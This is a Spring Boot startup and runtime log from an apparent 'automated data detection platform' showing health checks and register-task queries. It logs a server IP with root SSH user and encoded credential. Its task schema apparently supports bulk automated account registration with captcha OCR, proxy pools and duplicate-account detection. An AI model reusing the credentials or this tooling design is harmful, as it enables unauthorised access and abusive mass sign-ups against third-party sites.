[INFO] Scanning for projects...
[INFO] 
[INFO] ------------------< com.detection:detection-platform >------------------
[INFO] Building 自动化数据检测平台 1.0.0
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] >>> spring-boot:3.1.5:run (default-cli) > test-compile @ detection-platform >>>
[INFO] 
[INFO] --- resources:3.3.1:resources (default-resources) @ detection-platform ---
[INFO] Copying 1 resource from src/main/resources to target/classes
[INFO] Copying 0 resource from src/main/resources to target/classes
[INFO] 
[INFO] --- compiler:3.11.0:compile (default-compile) @ detection-platform ---
[INFO] Nothing to compile - all classes are up to date
[INFO] 
[INFO] --- resources:3.3.1:testResources (default-testResources) @ detection-platform ---
[INFO] skip non existing resourceDirectory /root/jc-test/backend/src/test/resources
[INFO] 
[INFO] --- compiler:3.11.0:testCompile (default-testCompile) @ detection-platform ---
[INFO] Nothing to compile - all classes are up to date
[INFO] 
[INFO] <<< spring-boot:3.1.5:run (default-cli) < test-compile @ detection-platform <<<
[INFO] 
[INFO] 
[INFO] --- spring-boot:3.1.5:run (default-cli) @ detection-platform ---
[INFO] Attaching agents: []

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::                (v3.1.5)

2025-11-20 10:23:30 [main] INFO  c.detection.platform.DetectionPlatformApplication - Starting DetectionPlatformApplication using Java 17.0.9 with PID 23275 (/root/jc-test/backend/target/classes started by root in /root/jc-test/backend)
2025-11-20 10:23:30 [main] DEBUG c.detection.platform.DetectionPlatformApplication - Running with Spring Boot v3.1.5, Spring v6.0.13
2025-11-20 10:23:30 [main] INFO  c.detection.platform.DetectionPlatformApplication - No active profile set, falling back to 1 default profile: "default"
2025-11-20 10:23:31 [main] INFO  o.s.d.r.config.RepositoryConfigurationDelegate - Multiple Spring Data modules found, entering strict repository configuration mode
2025-11-20 10:23:31 [main] INFO  o.s.d.r.config.RepositoryConfigurationDelegate - Bootstrapping Spring Data Redis repositories in DEFAULT mode.
2025-11-20 10:23:31 [main] INFO  o.s.d.r.config.RepositoryConfigurationDelegate - Finished Spring Data repository scanning in 34 ms. Found 0 Redis repository interfaces.
2025-11-20 10:23:32 [main] INFO  o.s.boot.web.embedded.tomcat.TomcatWebServer - Tomcat initialized with port(s): 8080 (http)
2025-11-20 10:23:32 [main] INFO  org.apache.catalina.core.StandardService - Starting service [Tomcat]
2025-11-20 10:23:32 [main] INFO  org.apache.catalina.core.StandardEngine - Starting Servlet engine: [Apache Tomcat/10.1.15]
2025-11-20 10:23:32 [main] INFO  o.a.c.core.ContainerBase.[Tomcat].[localhost].[/] - Initializing Spring embedded WebApplicationContext
2025-11-20 10:23:32 [main] INFO  o.s.b.w.s.c.ServletWebServerApplicationContext - Root WebApplicationContext: initialization completed in 2048 ms
 _ _   |_  _ _|_. ___ _ |    _ 
| | |\/|_)(_| | |_\  |_)||_|_\ 
     /               |         
                        3.5.5 
2025-11-20 10:23:35 [main] INFO  o.s.security.web.DefaultSecurityFilterChain - Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@762f8ff6, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@30ed2a26, org.springframework.security.web.context.SecurityContextHolderFilter@320ba79f, org.springframework.security.web.header.HeaderWriterFilter@4ba402b5, org.springframework.security.web.authentication.logout.LogoutFilter@70aa03c0, com.detection.platform.config.SecurityConfig$JwtAuthenticationFilter@1bf10539, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@5ffdd510, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@344a065a, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@1e406cbe, org.springframework.security.web.session.SessionManagementFilter@d02c00, org.springframework.security.web.access.ExceptionTranslationFilter@24d0c6a4, org.springframework.security.web.access.intercept.AuthorizationFilter@297dff3a]
2025-11-20 10:23:35 [main] INFO  org.quartz.impl.StdSchedulerFactory - Using default implementation for ThreadExecutor
2025-11-20 10:23:35 [main] INFO  org.quartz.core.SchedulerSignalerImpl - Initialized Scheduler Signaller of type: class org.quartz.core.SchedulerSignalerImpl
2025-11-20 10:23:35 [main] INFO  org.quartz.core.QuartzScheduler - Quartz Scheduler v.2.3.2 created.
2025-11-20 10:23:35 [main] INFO  org.quartz.simpl.RAMJobStore - RAMJobStore initialized.
2025-11-20 10:23:35 [main] INFO  org.quartz.core.QuartzScheduler - Scheduler meta-data: Quartz Scheduler (v2.3.2) 'quartzScheduler' with instanceId 'NON_CLUSTERED'
  Scheduler class: 'org.quartz.core.QuartzScheduler' - running locally.
  NOT STARTED.
  Currently in standby mode.
  Number of jobs executed: 0
  Using thread pool 'org.quartz.simpl.SimpleThreadPool' - with 10 threads.
  Using job-store 'org.quartz.simpl.RAMJobStore' - which does not support persistence. and is not clustered.

2025-11-20 10:23:35 [main] INFO  org.quartz.impl.StdSchedulerFactory - Quartz scheduler 'quartzScheduler' initialized from an externally provided properties instance.
2025-11-20 10:23:35 [main] INFO  org.quartz.impl.StdSchedulerFactory - Quartz scheduler version: 2.3.2
2025-11-20 10:23:35 [main] INFO  org.quartz.core.QuartzScheduler - JobFactory set to: org.springframework.scheduling.quartz.SpringBeanJobFactory@31cd0efa
2025-11-20 10:23:35 [main] INFO  o.s.boot.web.embedded.tomcat.TomcatWebServer - Tomcat started on port(s): 8080 (http) with context path ''
2025-11-20 10:23:35 [main] INFO  o.s.m.simp.broker.SimpleBrokerMessageHandler - Starting...
2025-11-20 10:23:35 [main] INFO  o.s.m.simp.broker.SimpleBrokerMessageHandler - BrokerAvailabilityEvent[available=true, SimpleBrokerMessageHandler [org.springframework.messaging.simp.broker.DefaultSubscriptionRegistry@6b2efcae]]
2025-11-20 10:23:35 [main] INFO  o.s.m.simp.broker.SimpleBrokerMessageHandler - Started.
2025-11-20 10:23:35 [main] INFO  o.s.a.rabbit.connection.CachingConnectionFactory - Attempting to connect to: [localhost:5672]
2025-11-20 10:23:36 [main] INFO  o.s.a.rabbit.connection.CachingConnectionFactory - Created new connection: rabbitConnectionFactory#55b62db8:0/SimpleConnection@47fc9ce [delegate=amqp://admin@127.0.0.1:5672/, localPort=36204]
2025-11-20 10:23:36 [main] INFO  o.s.scheduling.quartz.SchedulerFactoryBean - Starting Quartz Scheduler now
2025-11-20 10:23:36 [main] INFO  org.quartz.core.QuartzScheduler - Scheduler quartzScheduler_$_NON_CLUSTERED started.
2025-11-20 10:23:36 [MessageBroker-1] INFO  c.d.platform.scheduler.HealthCheckScheduler - 开始执行服务器健康检查定时任务
2025-11-20 10:23:36 [MessageBroker-2] INFO  c.d.platform.scheduler.HealthCheckScheduler - 开始执行代理健康检查定时任务
2025-11-20 10:23:36 [MessageBroker-3] DEBUG com.detection.platform.task.ServerMonitorTask - 开始执行服务器状态刷新定时任务
2025-11-20 10:23:36 [MessageBroker-2] INFO  c.d.platform.scheduler.HealthCheckScheduler - 代理健康检查定时任务执行完成
2025-11-20 10:23:36 [main] INFO  c.detection.platform.DetectionPlatformApplication - Started DetectionPlatformApplication in 5.865 seconds (process running for 6.267)

========================================
  自动化数据检测平台启动成功！
  API文档地址: http://localhost:8080/doc.html
========================================

2025-11-20 10:23:36 [MessageBroker-1] INFO  com.zaxxer.hikari.HikariDataSource - DetectionHikariPool - Starting...
2025-11-20 10:23:36 [MessageBroker-1] INFO  com.zaxxer.hikari.pool.HikariPool - DetectionHikariPool - Added connection com.mysql.cj.jdbc.ConnectionImpl@1803aa18
2025-11-20 10:23:36 [MessageBroker-1] INFO  com.zaxxer.hikari.HikariDataSource - DetectionHikariPool - Start completed.
2025-11-20 10:23:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - ==>  Preparing: SELECT id,server_name,ip_address,ssh_port,ssh_username,auth_type,auth_credential,docker_port,status,cpu_usage,memory_usage,disk_usage,network_in,network_out,max_concurrent,current_tasks,create_time,last_heartbeat_time,deleted FROM t_server WHERE deleted=0 ORDER BY create_time DESC
2025-11-20 10:23:36 [MessageBroker-3] DEBUG c.detection.platform.dao.ServerMapper.selectList - ==>  Preparing: SELECT id,server_name,ip_address,ssh_port,ssh_username,auth_type,auth_credential,docker_port,status,cpu_usage,memory_usage,disk_usage,network_in,network_out,max_concurrent,current_tasks,create_time,last_heartbeat_time,deleted FROM t_server WHERE deleted=0
2025-11-20 10:23:36 [MessageBroker-3] DEBUG c.detection.platform.dao.ServerMapper.selectList - ==> Parameters: 
2025-11-20 10:23:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - ==> Parameters: 
2025-11-20 10:23:36 [MessageBroker-3] DEBUG c.detection.platform.dao.ServerMapper.selectList - <==      Total: 1
2025-11-20 10:23:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - <==      Total: 1
2025-11-20 10:23:36 [MessageBroker-3] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==>  Preparing: SELECT id,server_name,ip_address,ssh_port,ssh_username,auth_type,auth_credential,docker_port,status,cpu_usage,memory_usage,disk_usage,network_in,network_out,max_concurrent,current_tasks,create_time,last_heartbeat_time,deleted FROM t_server WHERE id=? AND deleted=0
2025-11-20 10:23:36 [MessageBroker-3] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==> Parameters: 2(Long)
2025-11-20 10:23:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==>  Preparing: SELECT id,server_name,ip_address,ssh_port,ssh_username,auth_type,auth_credential,docker_port,status,cpu_usage,memory_usage,disk_usage,network_in,network_out,max_concurrent,current_tasks,create_time,last_heartbeat_time,deleted FROM t_server WHERE id=? AND deleted=0
2025-11-20 10:23:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==> Parameters: 2(Long)
2025-11-20 10:23:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - <==      Total: 1
2025-11-20 10:23:36 [MessageBroker-3] DEBUG c.detection.platform.dao.ServerMapper.selectById - <==      Total: 1
2025-11-20 10:23:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==>  Preparing: SELECT id,server_name,ip_address,ssh_port,ssh_username,auth_type,auth_credential,docker_port,status,cpu_usage,memory_usage,disk_usage,network_in,network_out,max_concurrent,current_tasks,create_time,last_heartbeat_time,deleted FROM t_server WHERE id=? AND deleted=0
2025-11-20 10:23:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==> Parameters: 2(Long)
2025-11-20 10:23:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - <==      Total: 1
2025-11-20 10:23:39 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - ==>  Preparing: UPDATE t_server SET server_name=?, ip_address=?, ssh_port=?, ssh_username=?, auth_type=?, auth_credential=?, status=?, cpu_usage=?, memory_usage=?, disk_usage=?, network_in=?, network_out=?, max_concurrent=?, current_tasks=?, create_time=?, last_heartbeat_time=? WHERE id=? AND deleted=0
2025-11-20 10:23:39 [MessageBroker-3] DEBUG c.detection.platform.dao.ServerMapper.updateById - ==>  Preparing: UPDATE t_server SET server_name=?, ip_address=?, ssh_port=?, ssh_username=?, auth_type=?, auth_credential=?, status=?, cpu_usage=?, memory_usage=?, disk_usage=?, network_in=?, network_out=?, max_concurrent=?, current_tasks=?, create_time=?, last_heartbeat_time=? WHERE id=? AND deleted=0
2025-11-20 10:23:39 [MessageBroker-3] DEBUG c.detection.platform.dao.ServerMapper.updateById - ==> Parameters: TEST(String), 103.246.246.13(String), 22(Integer), root(String), 1(Integer), /L29YpLuGzMzlNADVsKuOg==(String), 1(Integer), 2.4(BigDecimal), 3.58477(BigDecimal), 5(BigDecimal), 0(Long), 0(Long), 10(Integer), 0(Integer), 2025-11-14T08:46:51(LocalDateTime), 2025-11-20T10:23:39.780349529(LocalDateTime), 2(Long)
2025-11-20 10:23:39 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - ==> Parameters: TEST(String), 103.246.246.13(String), 22(Integer), root(String), 1(Integer), /L29YpLuGzMzlNADVsKuOg==(String), 1(Integer), 1.6(BigDecimal), 3.58155(BigDecimal), 5(BigDecimal), 0(Long), 0(Long), 10(Integer), 0(Integer), 2025-11-14T08:46:51(LocalDateTime), 2025-11-20T10:23:39.737548600(LocalDateTime), 2(Long)
2025-11-20 10:23:39 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - <==    Updates: 1
2025-11-20 10:23:39 [MessageBroker-1] INFO  c.d.platform.service.impl.ServerServiceImpl - 刷新服务器状态成功, ID: 2, CPU: 1.6%, 内存: 3.58155%, 磁盘: 5%, 网络: 0/0 KB/s
2025-11-20 10:23:39 [MessageBroker-1] DEBUG c.d.platform.scheduler.HealthCheckScheduler - 服务器健康检查完成, ID: 2, 名称: TEST
2025-11-20 10:23:39 [MessageBroker-1] INFO  c.d.platform.scheduler.HealthCheckScheduler - 服务器健康检查定时任务执行完成
2025-11-20 10:23:39 [MessageBroker-3] DEBUG c.detection.platform.dao.ServerMapper.updateById - <==    Updates: 1
2025-11-20 10:23:39 [MessageBroker-3] INFO  c.d.platform.service.impl.ServerServiceImpl - 刷新服务器状态成功, ID: 2, CPU: 2.4%, 内存: 3.58477%, 磁盘: 5%, 网络: 0/0 KB/s
2025-11-20 10:23:39 [MessageBroker-3] INFO  c.d.platform.service.impl.ServerServiceImpl - 刷新所有服务器状态完成, 总数: 1, 成功: 1
2025-11-20 10:23:39 [MessageBroker-3] DEBUG com.detection.platform.task.ServerMonitorTask - 服务器状态刷新完成，刷新数量: 1
2025-11-20 10:23:42 [http-nio-8080-exec-1] INFO  o.a.c.core.ContainerBase.[Tomcat].[localhost].[/] - Initializing Spring DispatcherServlet 'dispatcherServlet'
2025-11-20 10:23:42 [http-nio-8080-exec-1] INFO  org.springframework.web.servlet.DispatcherServlet - Initializing Servlet 'dispatcherServlet'
2025-11-20 10:23:42 [http-nio-8080-exec-1] INFO  org.springframework.web.servlet.DispatcherServlet - Completed initialization in 2 ms
2025-11-20 10:23:42 [http-nio-8080-exec-1] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:23:42 [http-nio-8080-exec-1] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:23:42 [http-nio-8080-exec-1] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:23:42 [http-nio-8080-exec-1] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:23:42 [http-nio-8080-exec-1] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:23:42 [http-nio-8080-exec-1] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:23:42 [http-nio-8080-exec-1] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:23:52 [http-nio-8080-exec-2] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:23:52 [http-nio-8080-exec-2] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:23:52 [http-nio-8080-exec-2] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:23:52 [http-nio-8080-exec-2] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:23:52 [http-nio-8080-exec-2] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:23:52 [http-nio-8080-exec-2] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:23:52 [http-nio-8080-exec-2] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:24:02 [http-nio-8080-exec-3] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:24:02 [http-nio-8080-exec-3] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:24:02 [http-nio-8080-exec-3] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:24:02 [http-nio-8080-exec-3] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:24:02 [http-nio-8080-exec-3] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:24:02 [http-nio-8080-exec-3] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:24:02 [http-nio-8080-exec-3] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:24:06 [MessageBroker-3] DEBUG com.detection.platform.task.ServerMonitorTask - 开始执行服务器状态刷新定时任务
2025-11-20 10:24:06 [MessageBroker-3] DEBUG c.detection.platform.dao.ServerMapper.selectList - ==>  Preparing: SELECT id,server_name,ip_address,ssh_port,ssh_username,auth_type,auth_credential,docker_port,status,cpu_usage,memory_usage,disk_usage,network_in,network_out,max_concurrent,current_tasks,create_time,last_heartbeat_time,deleted FROM t_server WHERE deleted=0
2025-11-20 10:24:06 [MessageBroker-3] DEBUG c.detection.platform.dao.ServerMapper.selectList - ==> Parameters: 
2025-11-20 10:24:06 [MessageBroker-3] DEBUG c.detection.platform.dao.ServerMapper.selectList - <==      Total: 1
2025-11-20 10:24:06 [MessageBroker-3] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==>  Preparing: SELECT id,server_name,ip_address,ssh_port,ssh_username,auth_type,auth_credential,docker_port,status,cpu_usage,memory_usage,disk_usage,network_in,network_out,max_concurrent,current_tasks,create_time,last_heartbeat_time,deleted FROM t_server WHERE id=? AND deleted=0
2025-11-20 10:24:06 [MessageBroker-3] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==> Parameters: 2(Long)
2025-11-20 10:24:06 [MessageBroker-3] DEBUG c.detection.platform.dao.ServerMapper.selectById - <==      Total: 1
2025-11-20 10:24:09 [MessageBroker-3] DEBUG c.detection.platform.dao.ServerMapper.updateById - ==>  Preparing: UPDATE t_server SET server_name=?, ip_address=?, ssh_port=?, ssh_username=?, auth_type=?, auth_credential=?, status=?, cpu_usage=?, memory_usage=?, disk_usage=?, network_in=?, network_out=?, max_concurrent=?, current_tasks=?, create_time=?, last_heartbeat_time=? WHERE id=? AND deleted=0
2025-11-20 10:24:09 [MessageBroker-3] DEBUG c.detection.platform.dao.ServerMapper.updateById - ==> Parameters: TEST(String), 103.246.246.13(String), 22(Integer), root(String), 1(Integer), /L29YpLuGzMzlNADVsKuOg==(String), 1(Integer), 0.8(BigDecimal), 3.58854(BigDecimal), 5(BigDecimal), 0(Long), 0(Long), 10(Integer), 0(Integer), 2025-11-14T08:46:51(LocalDateTime), 2025-11-20T10:24:09.174076254(LocalDateTime), 2(Long)
2025-11-20 10:24:09 [MessageBroker-3] DEBUG c.detection.platform.dao.ServerMapper.updateById - <==    Updates: 1
2025-11-20 10:24:09 [MessageBroker-3] INFO  c.d.platform.service.impl.ServerServiceImpl - 刷新服务器状态成功, ID: 2, CPU: 0.8%, 内存: 3.58854%, 磁盘: 5%, 网络: 0/0 KB/s
2025-11-20 10:24:09 [MessageBroker-3] INFO  c.d.platform.service.impl.ServerServiceImpl - 刷新所有服务器状态完成, 总数: 1, 成功: 1
2025-11-20 10:24:09 [MessageBroker-3] DEBUG com.detection.platform.task.ServerMonitorTask - 服务器状态刷新完成，刷新数量: 1
2025-11-20 10:24:12 [http-nio-8080-exec-4] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:24:12 [http-nio-8080-exec-4] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:24:12 [http-nio-8080-exec-4] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:24:12 [http-nio-8080-exec-4] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:24:12 [http-nio-8080-exec-4] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:24:12 [http-nio-8080-exec-4] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:24:12 [http-nio-8080-exec-4] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:24:22 [http-nio-8080-exec-5] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:24:22 [http-nio-8080-exec-5] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:24:22 [http-nio-8080-exec-5] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:24:22 [http-nio-8080-exec-5] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:24:22 [http-nio-8080-exec-5] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:24:22 [http-nio-8080-exec-5] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:24:22 [http-nio-8080-exec-5] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:24:32 [http-nio-8080-exec-6] DEBUG c.d.p.c.SecurityConfig$JwtAuthenticationFilter - 公开路径，跳过JWT过滤器: /business/register/list
2025-11-20 10:24:32 [http-nio-8080-exec-6] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==>  Preparing: SELECT COUNT(*) AS total FROM t_register_task WHERE deleted = 0
2025-11-20 10:24:32 [http-nio-8080-exec-6] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - ==> Parameters: 
2025-11-20 10:24:32 [http-nio-8080-exec-6] DEBUG c.d.p.dao.RegisterTaskMapper.selectList_mpCount - <==      Total: 1
2025-11-20 10:24:32 [http-nio-8080-exec-6] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==>  Preparing: SELECT id,task_name,website_url,register_api,method,username_field,password_field,email_field,phone_field,need_phone,manual_phone,account_count,default_password,extra_params,need_captcha,captcha_type,captcha_api,captcha_field,ocr_method,need_token,token_field,token_source,data_source_id,use_proxy,proxy_pool_id,concurrency,auto_retry,retry_times,encryption_type,rsa_key_api,rsa_ts_param,encryption_header,value_field_name,dup_msg_substring,status,total_count,completed_count,success_count,fail_count,create_time,start_time,end_time,deleted FROM t_register_task WHERE deleted=0 ORDER BY create_time DESC LIMIT ?
2025-11-20 10:24:32 [http-nio-8080-exec-6] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - ==> Parameters: 10(Long)
2025-11-20 10:24:32 [http-nio-8080-exec-6] DEBUG c.d.platform.dao.RegisterTaskMapper.selectList - <==      Total: 5
2025-11-20 10:24:35 [MessageBroker-4] INFO  o.s.web.socket.config.WebSocketMessageBrokerStats - WebSocketSession[0 current WS(0)-HttpStream(0)-HttpPoll(0), 0 total, 0 closed abnormally (0 connect failure, 0 send limit, 0 transport error)], stompSubProtocol[processed CONNECT(0)-CONNECTED(0)-DISCONNECT(0)], stompBrokerRelay[null], inboundChannel[pool size = 0, active threads = 0, queued tasks = 0, completed tasks = 0], outboundChannel[pool size = 0, active threads = 0, queued tasks = 0, completed tasks = 0], sockJsScheduler[pool size = 4, active threads = 1, queued tasks = 3, completed tasks = 4]
2025-11-20 10:24:36 [MessageBroker-1] DEBUG com.detection.platform.task.ServerMonitorTask - 开始执行服务器状态刷新定时任务
2025-11-20 10:24:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - ==>  Preparing: SELECT id,server_name,ip_address,ssh_port,ssh_username,auth_type,auth_credential,docker_port,status,cpu_usage,memory_usage,disk_usage,network_in,network_out,max_concurrent,current_tasks,create_time,last_heartbeat_time,deleted FROM t_server WHERE deleted=0
2025-11-20 10:24:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - ==> Parameters: 
2025-11-20 10:24:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectList - <==      Total: 1
2025-11-20 10:24:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==>  Preparing: SELECT id,server_name,ip_address,ssh_port,ssh_username,auth_type,auth_credential,docker_port,status,cpu_usage,memory_usage,disk_usage,network_in,network_out,max_concurrent,current_tasks,create_time,last_heartbeat_time,deleted FROM t_server WHERE id=? AND deleted=0
2025-11-20 10:24:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - ==> Parameters: 2(Long)
2025-11-20 10:24:36 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.selectById - <==      Total: 1
2025-11-20 10:24:39 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - ==>  Preparing: UPDATE t_server SET server_name=?, ip_address=?, ssh_port=?, ssh_username=?, auth_type=?, auth_credential=?, status=?, cpu_usage=?, memory_usage=?, disk_usage=?, network_in=?, network_out=?, max_concurrent=?, current_tasks=?, create_time=?, last_heartbeat_time=? WHERE id=? AND deleted=0
2025-11-20 10:24:39 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - ==> Parameters: TEST(String), 103.246.246.13(String), 22(Integer), root(String), 1(Integer), /L29YpLuGzMzlNADVsKuOg==(String), 1(Integer), 0.8(BigDecimal), 3.56603(BigDecimal), 5(BigDecimal), 0(Long), 0(Long), 10(Integer), 0(Integer), 2025-11-14T08:46:51(LocalDateTime), 2025-11-20T10:24:39.241456706(LocalDateTime), 2(Long)
2025-11-20 10:24:39 [MessageBroker-1] DEBUG c.detection.platform.dao.ServerMapper.updateById - <==    Updates: 1
2025-11-20 10:24:39 [MessageBroker-1] INFO  c.d.platform.service.impl.ServerServiceImpl - 刷新服务器状态成功, ID: 2, CPU: 0.8%, 内存: 3.56603%, 磁盘: 5%, 网络: 0/0 KB/s
